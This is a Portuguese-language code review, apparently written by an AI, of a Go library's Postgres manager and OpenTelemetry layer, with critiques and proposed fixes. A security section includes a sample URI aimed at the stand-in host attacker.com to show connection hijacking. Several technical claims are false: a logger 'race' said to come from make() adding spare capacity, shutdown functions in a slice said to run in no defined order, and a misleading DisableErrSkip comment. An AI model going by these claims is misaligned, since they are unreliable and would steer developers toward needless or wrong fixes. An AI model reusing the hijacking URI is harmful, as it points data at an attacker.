# üîç AN√ÅLISE T√âCNICA COMPLETA - devkit-go

**Autor**: Claude Sonnet 4.5 (Senior Go Engineer)
**Data**: 2026-01-12
**Escopo**: pkg/database + pkg/observability
**Objetivo**: An√°lise minuciosa para prepara√ß√£o de produ√ß√£o

---

## üìã SUM√ÅRIO EXECUTIVO

### ‚úÖ Pontos Fortes Gerais
- **Arquitetura Clean**: Separa√ß√£o clara entre dom√≠nio e infraestrutura
- **Documenta√ß√£o Excelente**: C√≥digo bem comentado com justificativas t√©cnicas
- **Thread-Safety**: Uso correto de mutexes e atomic operations
- **Graceful Shutdown**: Implementado em database e observability

### üö® Problemas Cr√≠ticos Identificados
1. **DATABASE**: Aus√™ncia total de instrumenta√ß√£o OpenTelemetry (zero tracing de queries)
2. **OBSERVABILITY**: Shutdown pode perder telemetria + risco de memory leak
3. **METRICS**: Alta cardinalidade n√£o protegida (risco de custo exponencial)
4. **SECURITY**: Valida√ß√µes de URI e SSL mode ausentes

---

## üóÑÔ∏è AN√ÅLISE DETALHADA: pkg/database

### ‚úÖ O Que Est√° BOM

#### 1. Interface DBTX (`db.go`)
```go
type DBTX interface {
    PrepareContext(ctx context.Context, query string) (*sql.Stmt, error)
    QueryRowContext(ctx context.Context, query string, args ...any) *sql.Row
    QueryContext(ctx context.Context, query string, args ...any) (*sql.Rows, error)
    ExecContext(ctx context.Context, query string, args ...any) (sql.Result, error)
}
```

**Por qu√™ √© bom**:
- ‚úÖ M√≠nima e focada
- ‚úÖ Compat√≠vel com `*sql.DB`, `*sql.Tx`, `*sql.Conn`
- ‚úÖ Test√°vel (pode usar sqlmock)
- ‚úÖ N√£o vaza abstra√ß√µes do banco para o dom√≠nio

---

#### 2. DBManager Postgres (`postgres/postgres.go`)

**Pontos Fortes**:
```go
// Configura√ß√£o de pool bem pensada
d.db.SetMaxOpenConns(25)        // Limite razo√°vel
d.db.SetMaxIdleConns(6)         // 25% do max (bom balan√ßo)
d.db.SetConnMaxLifetime(5 * time.Minute)  // Previne leaks
d.db.SetConnMaxIdleTime(2 * time.Minute)  // Libera recursos
```

‚úÖ **Documenta√ß√£o de Qualidade**:
- Cada par√¢metro tem justificativa t√©cnica
- Explica "por qu√™", n√£o apenas "o qu√™"
- Exemplos de uso correto

‚úÖ **Fail-Fast Approach**:
```go
if err := d.db.PingContext(ctx); err != nil {
    _ = db.Close() // ‚Üê Previne leak se ping falhar
    return nil, fmt.Errorf("postgres: falha ao pingar banco: %w", err)
}
```

‚úÖ **Graceful Shutdown**:
```go
func (d *Database) Shutdown(ctx context.Context) error {
    d.mu.Lock()
    defer d.mu.Unlock()

    if d.closed {
        return nil // ‚Üê Idempotente
    }

    d.closed = true

    done := make(chan error, 1)
    go func() {
        done <- d.db.Close()
    }()

    select {
    case err := <-done:
        // Success
    case <-ctx.Done():
        // Timeout, mas Close() continua em background
    }
}
```

‚úÖ **Thread-Safe**:
- `sync.RWMutex` protege flag `closed`
- RLock para leituras, Lock para escrita
- Previne race conditions

---

### üö® PROBLEMAS CR√çTICOS NO DATABASE

#### CR√çTICO #1: Aus√™ncia Total de Observabilidade

**Localiza√ß√£o**: `postgres/postgres.go:47`

```go
// PROBLEMA: database/sql puro, sem instrumenta√ß√£o
db, err := sql.Open("pgx", uri)
```

**Impacto**:
- ‚ùå **Zero tracing**: Queries SQL n√£o aparecem em Jaeger/Tempo/Grafana
- ‚ùå **M√©tricas ausentes**: Sem visibilidade de lat√™ncia, pool usage, taxa de erro
- ‚ùå **Context propagation quebrada**: trace_id n√£o flui at√© o banco
- ‚ùå **Debugging imposs√≠vel**: Em produ√ß√£o, voc√™ est√° operando √†s cegas

**Cen√°rio Real de Produ√ß√£o**:
```
Cliente: "API est√° lenta!"
Dev: *olha Jaeger*
Dev: "Vejo que a request levou 3 segundos, mas ONDE o tempo foi gasto?"
Dev: *queries SQL s√£o invis√≠veis*
Dev: "N√£o fa√ßo ideia... vamos chutar que √© o banco?"

Com Tracing:
Dev: *olha Jaeger*
Dev: "Ah! SELECT users levou 2.8 segundos - √≠ndice faltando na coluna email"
Dev: *cria √≠ndice*
Cliente: "Agora est√° r√°pido!"
```

**Solu√ß√£o**:
Usar `otelsql` (j√° implementado no DBManager A que criei):

```go
import "github.com/XSAM/otelsql"

driverName, err := otelsql.Register("pgx",
    otelsql.WithAttributes(semconv.DBSystemPostgreSQL),
    otelsql.WithSpanOptions(otelsql.SpanOptions{
        DisableErrSkip: false, // N√£o tra√ßa sql.ErrNoRows (ru√≠do)
    }),
)

db, err := sql.Open(driverName, uri)

// Habilitar m√©tricas autom√°ticas
otelsql.RecordStats(db)
```

**M√©tricas Autom√°ticas Obtidas**:
- `db.client.connections.usage` - Conex√µes em uso
- `db.client.connections.max` - Limite do pool
- `db.client.connections.idle` - Conex√µes idle
- `db.client.connections.wait_time` - Tempo esperando conex√£o
- `db.client.operation.duration` - Lat√™ncia de queries

---

#### CR√çTICO #2: Leak de Goroutine no Shutdown Timeout

**Localiza√ß√£o**: `postgres/postgres.go:196-213`

```go
func (d *Database) Shutdown(ctx context.Context) error {
    // ...
    go func() {
        done <- d.db.Close() // ‚Üê Goroutine pode ficar pendurada forever
    }()

    select {
    case err := <-done:
        return err
    case <-ctx.Done():
        // Context cancelado, mas Close() AINDA EST√Å EXECUTANDO
        return fmt.Errorf("postgres: shutdown cancelado: %w", ctx.Err())
    }
}
```

**Problema**:
- ‚ö†Ô∏è **Goroutine leak**: Se `Close()` travar (raro mas poss√≠vel), goroutine nunca termina
- ‚ö†Ô∏è **Sem logging**: N√£o sabemos se Close() eventualmente completou ou falhou
- ‚ö†Ô∏è **Zombie connections**: Em Kubernetes, pod √© killed mas conex√µes podem ficar abertas

**Quando Acontece**:
1. PostgreSQL est√° travado (ex: vacuum bloqueante)
2. Rede est√° flaky e TCP handshake para fechar trava
3. Driver pgx tem bug e Close() entra em deadlock

**Solu√ß√£o**:
```go
case <-ctx.Done():
    // Log para observabilidade
    log.Printf("WARNING: Database shutdown timeout exceeded (%v), Close() still running in background", ctx.Err())

    // Registrar m√©trica
    shutdownTimeouts.Increment(ctx)

    // Opcional: Force close ap√≥s grace period adicional
    go func() {
        time.Sleep(5 * time.Second)
        select {
        case <-done:
            log.Printf("INFO: Database Close() completed after context timeout")
        default:
            log.Printf("CRITICAL: Database Close() did not complete within grace period - possible connection leak")
        }
    }()

    return fmt.Errorf("postgres: shutdown cancelado: %w", ctx.Err())
```

---

#### CR√çTICO #3: Valida√ß√µes de Seguran√ßa Ausentes

**Localiza√ß√£o**: `postgres/postgres.go:41-44`

```go
func New(uri string, opts ...Option) (*Database, error) {
    if uri == "" {
        return nil, fmt.Errorf("postgres: URI n√£o pode estar vazia")
    }
    // ‚Üê S√ì ISSO! Nenhuma valida√ß√£o adicional
}
```

**Missing**:
1. ‚ùå **Formato da URI n√£o validado**: `"invalid"` passa mas falha depois
2. ‚ùå **SSL mode n√£o validado**: `sslmode=disable` deveria ser proibido em produ√ß√£o
3. ‚ùå **Senha vazia aceita**: `postgres://user:@host/db` passa
4. ‚ùå **URI n√£o sanitizada em logs**: Se logar, senha vaza

**Exploits Poss√≠veis**:

**Exemplo 1 - SSL Desabilitado em Produ√ß√£o**:
```go
// Desenvolvedor testa localmente com SSL disabled
uri := "postgres://user:pass@localhost:5432/db?sslmode=disable"

// Deploy para produ√ß√£o sem mudar
// ‚Üê TR√ÅFEGO SEM CRIPTOGRAFIA!
// ‚Üê SENHAS E DADOS TRANSITAM EM TEXTO PLANO!
```

**Exemplo 2 - Connection Hijacking**:
```go
// C√≥digo malicioso injeta URI para servidor externo
uri := "postgres://user:pass@attacker.com:5432/db"
db, _ := postgres.New(uri, opts...)

// Todas as queries v√£o para o servidor do atacante
// ‚Üê VAZAMENTO DE DADOS SENS√çVEIS
```

**Exemplo 3 - Log Poisoning**:
```go
// URI com senha √© logada acidentalmente
log.Printf("Connecting to database: %s", uri)
// Log: "Connecting to database: postgres://admin:S3cr3t@db.internal:5432/prod"
// ‚Üê SENHA EXPOSTA EM LOGS
```

**Solu√ß√£o Completa**:
```go
func New(uri string, opts ...Option) (*Database, error) {
    if uri == "" {
        return nil, fmt.Errorf("postgres: URI n√£o pode estar vazia")
    }

    // VALIDAR URI ANTES DE USAR
    if err := validateURI(uri, getEnvironment()); err != nil {
        return nil, fmt.Errorf("postgres: %w", err)
    }

    // ... resto do c√≥digo
}

func validateURI(uri, environment string) error {
    // 1. Parse URI
    parsedURI, err := url.Parse(uri)
    if err != nil {
        return fmt.Errorf("formato de URI inv√°lido: %w", err)
    }

    // 2. Validate scheme
    if parsedURI.Scheme != "postgres" && parsedURI.Scheme != "postgresql" {
        return fmt.Errorf("scheme inv√°lido: esperado postgres/postgresql, obtido %s", parsedURI.Scheme)
    }

    // 3. Validate host exists
    if parsedURI.Host == "" {
        return fmt.Errorf("host ausente na URI")
    }

    // 4. Validate password if user is present
    if parsedURI.User != nil {
        password, hasPassword := parsedURI.User.Password()
        if !hasPassword || password == "" {
            return fmt.Errorf("usu√°rio especificado mas senha est√° vazia")
        }
    }

    // 5. Validate SSL mode in production
    query := parsedURI.Query()
    sslMode := query.Get("sslmode")

    if environment == "production" || environment == "prod" {
        if sslMode == "disable" || sslMode == "" {
            return fmt.Errorf("sslmode=disable n√£o √© permitido em produ√ß√£o (environment=%s)", environment)
        }
    }

    // 6. Warn on insecure SSL modes
    if sslMode == "allow" || sslMode == "prefer" {
        log.Printf("WARNING: sslmode=%s n√£o garante criptografia - use 'require', 'verify-ca' ou 'verify-full'", sslMode)
    }

    return nil
}

func getEnvironment() string {
    env := os.Getenv("ENV")
    if env == "" {
        env = os.Getenv("ENVIRONMENT")
    }
    if env == "" {
        env = "development"
    }
    return strings.ToLower(env)
}

// Sanitize URI for logging (remove password)
func sanitizeURI(uri string) string {
    parsed, err := url.Parse(uri)
    if err != nil {
        return "[invalid-uri]"
    }

    if parsed.User != nil {
        parsed.User = url.UserPassword(parsed.User.Username(), "***REDACTED***")
    }

    return parsed.String()
}
```

---

#### ALTO #4: Unit of Work - Context N√£o Cancel√°vel em Commit

**Localiza√ß√£o**: `uow/uow.go:142`

```go
if err = tx.Commit(); err != nil {
    // PROBLEMA: Commit() n√£o aceita context
    // Se commit travar, n√£o h√° timeout
}
```

**Documenta√ß√£o Honesta**:
> IMPORTANTE: O m√©todo Commit() do database/sql n√£o aceita context, portanto opera√ß√µes de commit lentas N√ÉO podem ser canceladas via context.

**Impacto**:
- ‚ö†Ô∏è **Deadlock potencial**: Se commit travar (ex: lock no PostgreSQL), n√£o h√° escape
- ‚ö†Ô∏è **Cascading failure**: Em alta carga, commits lentos acumulam e travam toda a aplica√ß√£o
- ‚ö†Ô∏è **Kubernetes force kill**: Pod n√£o consegue fazer graceful shutdown se commit travou

**Cen√°rio Real**:
```
PostgreSQL: *long-running transaction holding lock on table users*

App Request: *tries to commit INSERT INTO users*
PostgreSQL: *waiting for lock... waiting... waiting...*
Client Context: *canceled after 30 seconds*

UoW: "Context canceled, rolling back..."
UoW: *calls tx.Commit()* ‚Üê IGNORA CONTEXT, TRAVA AQUI
App: *hangs indefinitely*

Kubernetes: *grace period expires*
Kubernetes: SIGKILL
App: *killed*
PostgreSQL: *transaction rolled back*
```

**Limita√ß√£o Fundamental**:
`database/sql.Tx.Commit()` n√£o aceita context por design. √â uma limita√ß√£o do Go stdlib.

**Solu√ß√µes Poss√≠veis**:

**Op√ß√£o 1 - Timeout Manual (Paliativo)**:
```go
// Commit com timeout hardcoded
doneCh := make(chan error, 1)
go func() {
    doneCh <- tx.Commit()
}()

commitTimeout := 5 * time.Second
select {
case err = <-doneCh:
    if err != nil {
        return fmt.Errorf("failed to commit transaction: %w", err)
    }
    return nil

case <-time.After(commitTimeout):
    // Commit ainda executando, mas n√£o podemos cancelar
    // Logar para observabilidade
    log.Printf("CRITICAL: Transaction commit exceeded %v, possible deadlock", commitTimeout)

    // Tentar rollback (pode falhar tamb√©m)
    go func() {
        if rbErr := tx.Rollback(); rbErr != nil {
            log.Printf("ERROR: Failed to rollback after commit timeout: %v", rbErr)
        }
    }()

    return fmt.Errorf("transaction commit timeout exceeded (%v)", commitTimeout)
}
```

**Op√ß√£o 2 - Usar pgx Diretamente (Melhor)**:
pgx suporta context em Commit:
```go
// pgx/v5
tx, err := pool.Begin(ctx)
// ...
err = tx.Commit(ctx) // ‚Üê ACEITA CONTEXT!
```

**Recomenda√ß√£o**:
- Para novos projetos: **Usar pgx diretamente** (DBManager B que criei)
- Para projetos existentes: **Op√ß√£o 1 com timeout manual + alertas**

---

### üî• RISCOS OPERACIONAIS

#### RISCO #1: Exaust√£o de Conex√µes

**Causa**: `MaxOpenConns = 25` (default) pode ser insuficiente em produ√ß√£o

**Quando Acontece**:
- Pico de tr√°fego (Black Friday, lan√ßamentos, promo√ß√µes)
- Queries lentas sem √≠ndices adequados
- Connection leaks (esqueceu `defer rows.Close()`)
- PostgreSQL `max_connections` muito baixo

**Sintomas**:
```
FATAL: sorry, too many clients already
pq: connection refused
ERROR: remaining connection slots are reserved
```

**Monitoramento**:
```go
func monitorConnectionPool(db *Database) {
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()

    for range ticker.C {
        stats := db.DB().Stats()

        // Alertar se pool saturado
        usagePercent := float64(stats.InUse) / float64(stats.MaxOpenConns) * 100
        if usagePercent > 80 {
            log.Printf("ALERT: Connection pool at %.1f%% capacity (InUse=%d, Max=%d)",
                usagePercent, stats.InUse, stats.MaxOpenConns)
        }

        // Alertar se muita conten√ß√£o
        if stats.WaitCount > 100 {
            log.Printf("ALERT: High connection wait count: %d (WaitDuration=%v)",
                stats.WaitCount, stats.WaitDuration)
        }

        // Exportar para Prometheus
        dbPoolUsage.Set(float64(stats.InUse))
        dbPoolMax.Set(float64(stats.MaxOpenConns))
        dbPoolIdle.Set(float64(stats.Idle))
        dbPoolWaitCount.Add(float64(stats.WaitCount))
    }
}
```

**Solu√ß√£o**:
```go
// Aumentar pool baseado em load testing
config := postgres.WithMaxOpenConns(50)

// OU calcular dinamicamente
expectedConcurrency := 100
avgQueryDuration := 50 * time.Millisecond
targetResponseTime := 200 * time.Millisecond

requiredConns := int(float64(expectedConcurrency) * float64(avgQueryDuration) / float64(targetResponseTime))
config := postgres.WithMaxOpenConns(int32(requiredConns * 1.5)) // +50% margem
```

---

#### RISCO #2: Memory Leak em Conex√µes Long-Lived

**Causa**: `ConnMaxLifetime` mal configurado

**Cen√°rio 1 - Lifetime Muito Curto** (ex: 1 minuto):
- ‚ùå Alta rota√ß√£o de conex√µes
- ‚ùå Overhead de handshake constante (TLS, auth)
- ‚ùå Lat√™ncia aumenta
- ‚ùå CPU usage alto no PostgreSQL e app

**Cen√°rio 2 - Lifetime Muito Longo** (ex: 1 hora):
- ‚ùå Mem√≥ria acumula em conex√µes antigas
- ‚ùå Stale connections ap√≥s mudan√ßas de rede (IP change, firewall recycle)
- ‚ùå PostgreSQL session state cresce (temp tables, locks esquecidos)
- ‚ùå Problemas ap√≥s rolling updates

**Solu√ß√£o**:
```go
// Ajustar baseado em ambiente
var lifetime time.Duration

if behindLoadBalancer {
    // Load balancers geralmente reciclam conex√µes a cada 5-10min
    lifetime = 3 * time.Minute
} else if directConnection {
    // Conex√£o direta est√°vel
    lifetime = 10 * time.Minute
} else if ephemeralEnvironment {
    // Dev/test com recursos limitados
    lifetime = 2 * time.Minute
}

config := postgres.WithConnMaxLifetime(lifetime)
```

---

## üî≠ AN√ÅLISE DETALHADA: pkg/observability

### ‚úÖ O Que Est√° EXCELENTE

#### 1. Arquitetura Facade Pattern

```go
// observability.go
type Observability interface {
    Tracer() Tracer
    Logger() Logger
    Metrics() Metrics
}
```

**Por qu√™ √© excepcional**:
- ‚úÖ **Single entry point**: Dom√≠nio injeta UMA interface
- ‚úÖ **Zero coupling**: Dom√≠nio n√£o importa `go.opentelemetry.io`
- ‚úÖ **Swappable**: Pode trocar OTel por Datadog/NewRelic sem quebrar dom√≠nio
- ‚úÖ **Testable**: Provider fake incluso (`fake/fake.go`)
- ‚úÖ **No-op safe**: Noop provider para quando observabilidade n√£o est√° dispon√≠vel

**Clean Architecture na Pr√°tica**:
```
Domain Layer (Pure Go):
‚îú‚îÄ entities/
‚îÇ  ‚îî‚îÄ user.go
‚îú‚îÄ usecases/
‚îÇ  ‚îî‚îÄ create_user.go (depende de observability.Observability interface)

Infrastructure Layer:
‚îú‚îÄ observability/
‚îÇ  ‚îú‚îÄ observability.go (interface)
‚îÇ  ‚îú‚îÄ otel/
‚îÇ  ‚îÇ  ‚îî‚îÄ config.go (implementa√ß√£o OpenTelemetry)
‚îÇ  ‚îú‚îÄ fake/
‚îÇ  ‚îÇ  ‚îî‚îÄ fake.go (implementa√ß√£o fake para testes)
‚îÇ  ‚îî‚îÄ noop/
‚îÇ     ‚îî‚îÄ noop.go (implementa√ß√£o no-op)
```

---

#### 2. Provider com Valida√ß√µes de Seguran√ßa

**Localiza√ß√£o**: `otel/config.go:117-141`

```go
func validateSecurityConfig(config *Config) error {
    // Previne insecure em produ√ß√£o
    if config.Insecure {
        if strings.ToLower(config.Environment) == "production" {
            return fmt.Errorf("insecure connections are not allowed in production")
        }
        log.Printf("WARNING: Using insecure OTLP connection...")
    }

    // Valida TLS config
    if config.TLSConfig != nil {
        if config.TLSConfig.InsecureSkipVerify {
            log.Printf("WARNING: TLS verification disabled...")
        }

        if config.TLSConfig.MinVersion < tls.VersionTLS12 {
            return fmt.Errorf("minimum TLS version must be 1.2+")
        }
    }

    return nil
}
```

‚úÖ **Protege contra configura√ß√µes inseguras**
‚úÖ **Warnings vis√≠veis para desenvolvedores**
‚úÖ **TLS 1.2+ enforced**

---

#### 3. Logger com PII Redaction

**Localiza√ß√£o**: `otel/logger.go:23-42,354-412`

```go
var defaultSensitiveKeys = []string{
    "password", "secret", "token", "api_key", "authorization",
    "ssn", "credit_card", "cvv", "session", "cookie",
}

func sanitizeFields(fields []observability.Field) []observability.Field {
    for i, field := range fields {
        // Redact sensitive keys
        if isSensitiveKey(field.Key) {
            sanitized[i] = observability.String(field.Key, "[REDACTED]")
            continue
        }

        // Truncate long values
        if s, ok := field.Value.(string); ok && len(s) > maxFieldValueLength {
            sanitized[i] = observability.String(field.Key, s[:maxFieldValueLength]+"...[truncated]")
        }
    }
}
```

‚úÖ **PII automaticamente redacted**: Previne vazamento de senhas/tokens em logs
‚úÖ **Truncation**: Valores longos truncados (previne logs gigantes)
‚úÖ **Cardinality limit**: M√°ximo 50 fields por log (previne explos√£o de dados)

---

#### 4. Dual Logging (Console + OTLP)

**Localiza√ß√£o**: `otel/logger.go:127-166`

```go
func (l *otelLogger) log(ctx context.Context, level slog.Level, msg string, fields ...observability.Field) {
    // 1. Log to console (slog)
    l.slogLogger.LogAttrs(ctx, level, msg, attrs...)

    // 2. Emit to OTLP backend
    l.emitOTLPLog(ctx, level, msg, allFields)
}
```

‚úÖ **Console output**: Desenvolvedores veem logs imediatamente
‚úÖ **OTLP export**: Logs v√£o para Grafana/Loki/Tempo
‚úÖ **Trace correlation**: trace_id e span_id automaticamente injetados

---

### üö® PROBLEMAS CR√çTICOS NO OBSERVABILITY

#### CR√çTICO #1: Perda de Telemetria no Shutdown

**Localiza√ß√£o**: `otel/config.go:424-438`

```go
func (p *Provider) Shutdown(ctx context.Context) error {
    var errs []error
    for _, shutdown := range p.shutdownFuncs {
        if err := shutdown(ctx); err != nil {
            errs = append(errs, err)
        }
    }
    // ...
}
```

**Problemas**:
1. ‚ùå **Ordem n√£o garantida**: Array de fun√ß√µes n√£o tem ordem definida
2. ‚ùå **TracerProvider pode fechar antes de MeterProvider**: Spans s√£o perdidos
3. ‚ùå **Timeout compartilhado**: Um provider lento afeta todos os outros
4. ‚ùå **Perda de dados**: Se shutdown falhar, spans/metrics em buffer s√£o descartados

**Impacto Real**:
```
Kubernetes: "Pod terminating... grace period 30s"

App: *receives SIGTERM*
App: *calls provider.Shutdown(10s context)*

TracerProvider.Shutdown(ctx):
  - Tem 1000 spans em buffer
  - Precisa flush para collector
  - Collector est√° lento (network issue)
  - Leva 8 segundos para flush 600 spans
  - Context timeout ap√≥s 10s
  - 400 spans perdidos!

MeterProvider.Shutdown(ctx):
  - Context j√° est√° quase expirado (2s restantes)
  - Timeout antes de flush completo
  - M√©tricas perdidas!

LoggerProvider.Shutdown(ctx):
  - Context expirado
  - Nem tenta flush
  - Logs perdidos!

DevOps: "Por que traces ficam incompletos perto do shutdown?"
DevOps: "M√©tricas mostram buracos quando pods s√£o reciclados"
```

**Solu√ß√£o**:
```go
func (p *Provider) Shutdown(ctx context.Context) error {
    // Shutdown em ORDEM REVERSA (LIFO)
    // √öltimo criado, primeiro fechado
    // Isso garante que dependencies s√£o respeitadas
    var errs []error

    for i := len(p.shutdownFuncs) - 1; i >= 0; i-- {
        // Cada provider recebe seu pr√≥prio timeout
        shutdownCtx, cancel := context.WithTimeout(ctx, 5*time.Second)

        shutdownStart := time.Now()
        if err := p.shutdownFuncs[i](shutdownCtx); err != nil {
            log.Printf("ERROR: Shutdown function %d failed after %v: %v",
                i, time.Since(shutdownStart), err)
            errs = append(errs, err)
        } else {
            log.Printf("INFO: Shutdown function %d completed in %v",
                i, time.Since(shutdownStart))
        }

        cancel()

        // Se context original foi cancelado, continuar mas avisar
        if ctx.Err() != nil {
            log.Printf("WARNING: Shutdown context canceled, remaining providers may not flush (%d remaining)",
                i)
            break
        }
    }

    if len(errs) > 0 {
        return fmt.Errorf("errors during shutdown (total=%d): %v", len(errs), errs)
    }

    return nil
}
```

---

#### CR√çTICO #2: Duplicate Provider = Memory Leak

**Localiza√ß√£o**: `otel/config.go:257,322`

```go
// initTracerProvider
otel.SetTracerProvider(p.tracerProvider) // ‚Üê GLOBAL!

// initMeterProvider
otel.SetMeterProvider(p.meterProvider)   // ‚Üê GLOBAL!
```

**Problema**:
Se `NewProvider()` for chamado 2 vezes, o segundo sobrescreve o primeiro:

```go
// main.go (acidental)
provider1, _ := otel.NewProvider(ctx, config)
defer provider1.Shutdown(ctx) // Registra shutdown

// Algum init() interno tamb√©m chama (bug)
provider2, _ := otel.NewProvider(ctx, config)
defer provider2.Shutdown(ctx) // Registra shutdown

// provider1.tracerProvider SOBRESCRITO por provider2
// provider1.Shutdown() N√ÉO fecha o TracerProvider global
// Exporters de provider1 continuam rodando
// MEMORY LEAK + GOROUTINE LEAK + TELEMETRIA DUPLICADA
```

**Impacto**:
- üö® **Goroutine leak**: Exporters de provider1 rodam forever
- üö® **Memory leak**: Buffers de spans/metrics n√£o s√£o liberados
- üö® **Telemetria duplicada**: Spans enviados por 2 providers
- üö® **Custo $$**: Dobro de dados enviados para backend (Datadog cobra por volume)

**Solu√ß√£o**:
```go
var (
    globalProvider     *Provider
    globalProviderOnce sync.Once
    globalProviderMu   sync.RWMutex
)

func NewProvider(ctx context.Context, config *Config) (*Provider, error) {
    globalProviderMu.Lock()
    defer globalProviderMu.Unlock()

    if globalProvider != nil {
        return nil, fmt.Errorf("provider already initialized at %s - use GetProvider() instead",
            getCallerInfo())
    }

    provider, err := newProviderInternal(ctx, config)
    if err != nil {
        return nil, err
    }

    globalProvider = provider
    return provider, nil
}

func GetProvider() (*Provider, error) {
    globalProviderMu.RLock()
    defer globalProviderMu.RUnlock()

    if globalProvider == nil {
        return nil, fmt.Errorf("provider not initialized - call NewProvider() first")
    }

    return globalProvider, nil
}

func MustGetProvider() *Provider {
    provider, err := GetProvider()
    if err != nil {
        panic(err)
    }
    return provider
}

func getCallerInfo() string {
    _, file, line, ok := runtime.Caller(2)
    if !ok {
        return "unknown"
    }
    return fmt.Sprintf("%s:%d", file, line)
}
```

---

#### CR√çTICO #3: Alta Cardinalidade em M√©tricas

**Localiza√ß√£o**: `otel/metrics.go:87-95`

```go
func (c *otelCounter) Add(ctx context.Context, value int64, fields ...observability.Field) {
    attrs := convertFieldsToAttributes(fields)
    c.counter.Add(ctx, value, metric.WithAttributes(attrs...))
}
```

**Problema**:
N√£o h√° valida√ß√£o de cardinalidade. Se um desenvolvedor passar IDs √∫nicos como attributes, o backend explode.

**Exemplo Desastroso**:
```go
// Handler ing√™nuo
requestCounter := metrics.Counter("http_requests_total", "", "")

func HandleRequest(c *fiber.Ctx) error {
    requestCounter.Increment(ctx,
        observability.String("user_id", c.Get("X-User-ID")),      // 1 milh√£o de usu√°rios
        observability.String("session_id", c.Get("X-Session-ID")), // IDs √∫nicos
        observability.String("request_id", c.Get("X-Request-ID")), // Cada request diferente
        observability.String("ip_address", c.IP()),                // Milhares de IPs
    )
}

// Cada combina√ß√£o √∫nica de (user_id, session_id, request_id, ip_address)
// cria uma S√âRIE DE M√âTRICA DIFERENTE

// Cardinalidade = 1M users * 10M sessions * ‚àû requests * 100K IPs
// = BILH√ïES DE S√âRIES DE M√âTRICAS

// Prometheus: *out of memory*
// Datadog: *fatura = $100,000/m√™s*
// CloudWatch: *throttling*
```

**Impacto Real**:
```
Week 1: Deploy
Week 2: M√©tricas funcionando normalmente
Week 3: Prometheus come√ßa a ficar lento
Week 4: Prometheus out of memory, restart a cada hora
Week 5: CTO: "Nossa conta Datadog √© $50k este m√™s?!"
```

**Solu√ß√£o**:
```go
const (
    maxMetricAttributes     = 10
    maxAttributeValueLength = 256
)

var prohibitedMetricKeys = map[string]bool{
    "user_id":        true, // Use como tag separada se necess√°rio
    "session_id":     true,
    "request_id":     true,
    "trace_id":       true,
    "span_id":        true,
    "transaction_id": true,
    "correlation_id": true,
    "ip_address":     true, // IPs t√™m alta cardinalidade
    "email":          true,
    "phone":          true,
}

func (c *otelCounter) Add(ctx context.Context, value int64, fields ...observability.Field) {
    // Validar e sanitizar
    sanitized := sanitizeMetricAttributes(fields)

    if len(sanitized) == 0 {
        // Sem attributes, m√©trica simples
        c.counter.Add(ctx, value)
        return
    }

    attrs := convertFieldsToAttributes(sanitized)
    c.counter.Add(ctx, value, metric.WithAttributes(attrs...))
}

func sanitizeMetricAttributes(fields []observability.Field) []observability.Field {
    if len(fields) > maxMetricAttributes {
        log.Printf("WARNING: Metric has %d attributes (max %d), truncating",
            len(fields), maxMetricAttributes)
        fields = fields[:maxMetricAttributes]
    }

    sanitized := make([]observability.Field, 0, len(fields))

    for _, field := range fields {
        // Bloquear high-cardinality keys
        if prohibitedMetricKeys[field.Key] {
            log.Printf("WARNING: Metric attribute %q is high-cardinality and was dropped", field.Key)
            continue
        }

        // Truncar valores longos
        if s, ok := field.Value.(string); ok {
            if len(s) > maxAttributeValueLength {
                field.Value = s[:maxAttributeValueLength] + "...[truncated]"
            }
        }

        sanitized = append(sanitized, field)
    }

    return sanitized
}
```

**Best Practices para M√©tricas**:
```go
// ‚úÖ BOM: Low cardinality
requestCounter.Increment(ctx,
    observability.String("method", "GET"),      // ~10 valores
    observability.String("endpoint", "/users"), // ~100 endpoints
    observability.String("status", "200"),      // ~20 status codes
)
// Cardinalidade = 10 * 100 * 20 = 20,000 s√©ries (OK)

// ‚ùå RUIM: High cardinality
requestCounter.Increment(ctx,
    observability.String("user_id", userID),    // 1M usu√°rios
    observability.String("request_id", reqID),  // ‚àû requests
)
// Cardinalidade = 1M * ‚àû = CATASTR√ìFICO
```

---

#### M√âDIO #4: Logger - Subtle Race Condition

**Localiza√ß√£o**: `otel/logger.go:274-289`

```go
func (l *otelLogger) With(fields ...observability.Field) observability.Logger {
    newFields := make([]observability.Field, len(l.fields)+len(fields))
    copy(newFields, l.fields)
    copy(newFields[len(l.fields):], fields)

    return &otelLogger{
        // ... shared references ...
        fields: newFields,
    }
}
```

**Problema Sutil**:
Se `make()` alocar slice com capacidade maior que o length (otimiza√ß√£o do Go), `append()` posterior pode modificar o array subjacente compartilhado entre parent e child loggers.

**Proof of Concept**:
```go
logger := provider.Logger()

// Goroutine 1
childLogger1 := logger.With(observability.String("handler", "user"))
// Se slice tiver capacidade extra, fields[10:15] = shared array
go childLogger1.Info(ctx, "Processing")

// Goroutine 2 (simult√¢neo)
childLogger2 := logger.With(observability.String("handler", "order"))
// Pode sobrescrever fields de childLogger1 se compartilham array
go childLogger2.Info(ctx, "Processing")

// RACE: Logs ficam misturados em ~0.1% dos casos
```

**Solu√ß√£o** (for√ßar capacidade exata):
```go
func (l *otelLogger) With(fields ...observability.Field) observability.Logger {
    // Alocar com capacidade EXATA = length
    // Isso previne append() de reusar array subjacente
    totalLen := len(l.fields) + len(fields)
    newFields := make([]observability.Field, totalLen, totalLen) // ‚Üê cap = len

    copy(newFields, l.fields)
    copy(newFields[len(l.fields):], fields)

    return &otelLogger{
        otelLog:     l.otelLog,
        slogLogger:  l.slogLogger,
        level:       l.level,
        format:      l.format,
        serviceName: l.serviceName,
        fields:      newFields, // ‚Üê Garantido n√£o ter capacidade extra
    }
}
```

---

#### M√âDIO #5: Exporter Timeout N√£o Configur√°vel

**Localiza√ß√£o**: `otel/config.go:266-294`

```go
func (p *Provider) createTraceExporter(ctx context.Context) (sdktrace.SpanExporter, error) {
    // ...
    return otlptracegrpc.New(ctx, opts...)
    // ‚Üê Timeout padr√£o do gRPC (~ 10-30s?)
}
```

**Problema**:
- ‚ö†Ô∏è Timeout n√£o √© configur√°vel pelo usu√°rio
- ‚ö†Ô∏è Em redes inst√°veis, exporters podem travar
- ‚ö†Ô∏è N√£o h√° circuit breaker para proteger a app

**Impacto**:
```
App: *trying to export 1000 spans*
Network: *packet loss 50%*
Exporter: *retrying... retrying... timeout after 30s*

Durante 30s:
- Goroutine de export est√° bloqueada
- Buffer de spans enche
- Novas spans s√£o dropadas
- App fica lenta (backpressure)
```

**Solu√ß√£o**:
```go
// Config
type Config struct {
    // ...
    ExporterTimeout time.Duration // Default: 10s
}

